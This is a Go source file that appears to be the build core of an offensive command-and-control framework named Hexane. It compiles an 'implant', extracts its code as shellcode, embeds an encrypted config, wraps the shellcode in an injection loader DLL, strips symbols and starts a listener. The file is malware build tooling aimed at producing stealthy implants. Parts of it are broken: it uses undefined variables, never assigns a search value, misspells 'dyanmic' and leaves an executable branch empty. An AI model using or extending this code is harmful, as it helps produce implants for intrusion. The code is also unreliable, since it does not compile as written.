package core

import (
	"encoding/json"
	"fmt"
	"os"
	"path"
	"path/filepath"
	"strings"
	"time"
)

var (
	LinkerLoader = LoaderPath + "/linker.loader.ld"
	HashStrings  = ConfigsPath + "/strings.txt"
	DllMain      = LoaderPath + "/dllmain.cpp"
	RsrcScript   = LoaderPath + "/resource.rc"
	HashHeader   = CorelibInc + "/names.hpp"
)

func (h *HexaneConfig) GenerateConfig() error {
	key := CryptCreateKey(16)
	patch, err := h.PePatchConfig()
	if err != nil {
		return err
	}

	h.Key = key
	h.ConfigBytes = patch // Assuming XteaCrypt(patch) if needed.
	return nil
}

func (h *HexaneConfig) GenerateLoader() error {
	injectCfg, err := h.GetInjectConfig()
	if err != nil {
		return err
	}

	injectCfg.InjectConfig = h.GetEmbededStrings(injectCfg.Strings)

	rsrcObj := path.Join(h.Compiler.BuildDirectory, "resource.res")
	rsrcData := path.Join(h.Compiler.BuildDirectory, "shellcode.bin")
	coreCpp := path.Join(h.Compiler.BuildDirectory, "ldrcore.cpp")
	coreComponents := path.Join(h.Compiler.BuildDirectory, "ldrcore.cpp.o")
	output := path.Join(h.Compiler.BuildDirectory, h.ImplantName+h.Compiler.FileExtension)

	if err = h.RunWindres(rsrcObj, rsrcData); err != nil {
		return err
	}

	if err = h.CompileExecuteObject(coreCpp, injectCfg.ExecuteObj, coreComponents); err != nil {
		return err
	}

	components := []string{DllMain, rsrcObj, coreComponents}
	if err = h.CompileFinalDLL(components, output); err != nil {
		return err
	}

	if err = h.EmbedSectionData(output, ".text$G", injectCfg.InjectConfig); err != nil {
		return err
	}

	if !h.Compiler.Debug {
		if err = h.StripSymbols(output); err != nil {
			return err
		}
	}

	return nil
}

func (h *HexaneConfig) BuildModule(cfgName string) error {
	var (
		err     error
		buffer  []byte
		files   []string
		jsonCfg Module
	)

	if buffer, err = os.ReadFile(cfgName); err != nil {
		return err
	}

	if err = json.Unmarshal(buffer, &jsonCfg); err != nil {
		return err
	}

	if jsonCfg.OutputDir != "" {
		if err := CreateTemp(jsonCfg.OutputDir); err != nil {
			return err
		}
	} else {
		return fmt.Errorf("cannot find output directory")
	}

	if jsonCfg.Directories != nil {
		for _, dir := range jsonCfg.Directories {
			var src string

			searchPath := path.Join(jsonCfg.RootDir, dir)
			if !SearchFile(searchPath, src) {

				WrapMessage("ERR", "unable to find "+src+" in directory "+searchPath)
				continue
			}

			filename := path.Join(dir, src)
			files = append(files, filename)
		}
	} else {
		return fmt.Errorf("cannot find source directories")
	}

	for _, file := range files {
		var (
			srcFile string
			objFile string
		)

		srcFile = file
		objFile = path.Join(jsonCfg.OutputDir, filepath.Base(file)+".o")

		if err := h.CompileFile(srcFile, objFile, jsonCfg.Linker); err != nil {
			return err
		}

		h.Components = append(h.Components, objFile)
	}

	libFiles := strings.Join(h.Components, " ")
	libName := path.Join(jsonCfg.OutputDir, jsonCfg.OutputName+" "+libFiles)

	if jsonCfg.Linker != "" {
		h.Compiler.Flags = strings.Join(h.Compiler.Flags, " ")
	}

	if jsonCfg.Type == "static" {
		return h.RunCommand(h.Compiler.Ar + " crf " + libName)

	} else if jsonCfg.Type == "dyanmic" {
		return h.RunCommand(h.Compiler.Mingw + " -dynamic " + libFiles + " -o " + libName)

	} else if jsonCfg.Type == "executable" {

	}

	return h.FinalBuild(dstPath, outName)
}

func (h *HexaneConfig) RunBuild() error {

	if err := os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	if err := h.GenerateConfig(); err != nil {
		return err
	}

	if err := GenerateHashes(HashStrings, HashHeader); err != nil {
		return err
	}

	if !SearchFile(Corelib+"/build", "corelib.a") {
		if err := h.BuildModule("../core/corelib/corelib.json"); err != nil {
			return err
		}
	}

	if h.Implant.Injection != nil {
		if err := h.BuildModule("../inject/injectlib/injectlib.json"); err != nil {
			return err
		}
	}

	if err := h.BuildModule("../core/implant/implant.json"); err != nil {
		return err
	}

	if err := h.EmbedSectionData(path.Join(h.Compiler.BuildDirectory, "/build/implant.o"), ".text$F", h.ConfigBytes); err != nil {
		return err
	}

	if err := h.CopySectionData(path.Join(h.Compiler.BuildDirectory, "build/implant.o"), path.Join(h.Compiler.BuildDirectory, "shellcode.bin"), ".text"); err != nil {
		return err
	}

	if h.BuildType == "dll" {
		if err := h.GenerateLoader(); err != nil {
			return err
		}
	}

	AddConfig(h)
	go h.HttpServerHandler()

	time.Sleep(time.Millisecond * 500)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}

func (h *HexaneConfig) CompileFile(srcFile, outFile, linker string) error {
	var flags = h.Compiler.Flags

	if linker != "" {
		flags = append(flags, "-T", linker)
	}

	switch path.Ext(srcFile) {
	case ".cpp":
		return h.CompileObject(h.Compiler.Mingw+" -c ", []string{srcFile}, flags, []string{RootDirectory}, nil, outFile)
	case ".asm":
		return h.CompileObject(h.Compiler.Assembler+" -f win64 ", []string{srcFile}, nil, nil, nil, outFile)
	default:
		return nil
	}
}

func (h *HexaneConfig) RunWindres(rsrcObj, rsrcData string) error {
	cmd := fmt.Sprintf("%s -O coff %s -DRSRCDATA=\"%s\" -o %s", h.Compiler.Windres, RsrcScript, rsrcData, rsrcObj)
	return h.RunCommand(cmd)
}

func (h *HexaneConfig) CompileExecuteObject(coreCpp, executeObj, coreComponents string) error {
	return h.CompileObject(h.Compiler.Mingw+" -c ", []string{coreCpp, executeObj}, nil, h.Compiler.IncludeDirs, nil, coreComponents)
}

func (h *HexaneConfig) CompileFinalDLL(components []string, output string) error {
	return h.CompileObject(h.Compiler.Linker+" -T "+LinkerLoader, components, []string{"-shared"}, h.Compiler.IncludeDirs, nil, output)
}

func (h *HexaneConfig) FinalBuild(dstPath, outName string) error {
	outFile := path.Join(dstPath, outName)
	return h.CompileObject(h.Compiler.Mingw+" -c ", h.Components, h.Compiler.Flags, []string{RootDirectory}, nil, outFile)
}

func (h *HexaneConfig) StripSymbols(output string) error {
	return h.RunCommand(h.Compiler.Strip + " " + output)
}
